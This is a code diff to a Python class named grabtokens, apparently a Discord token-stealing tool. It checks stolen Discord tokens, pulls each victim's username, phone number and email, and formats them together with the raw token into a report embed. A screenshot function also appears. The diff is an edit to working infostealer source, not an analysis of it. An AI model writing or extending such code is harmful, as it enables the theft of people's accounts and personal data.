@@ -300,8 +300,6 @@ class grabtokens():
                                     pass
                                 if r.status_code == 200 and token not in self.tokens:
                                     self.tokens.append(token)
-                                    
-        embed.add_field(name="🔐  Token(s)", value=f"```{self.tokens}```", inline=False) 
         
         for token in self.tokens:
             r = requests.get(
@@ -312,7 +310,7 @@ class grabtokens():
             phone = r.json()['phone']
             email = r.json()['email']
                     
-            embed.add_field(name="🔷  DISCORD INFO", value=f"Username: {username}\n\nPhone: {phone}\n\nEmail: {email}", inline=False)  
+            embed.add_field(name=f"🔷  User: `{username}`", value=f"Token: `{token}`\n\nPhone: {phone}\n\nEmail: {email}", inline=False)  
 
 def ss():
     screenshot('screenshot.png')
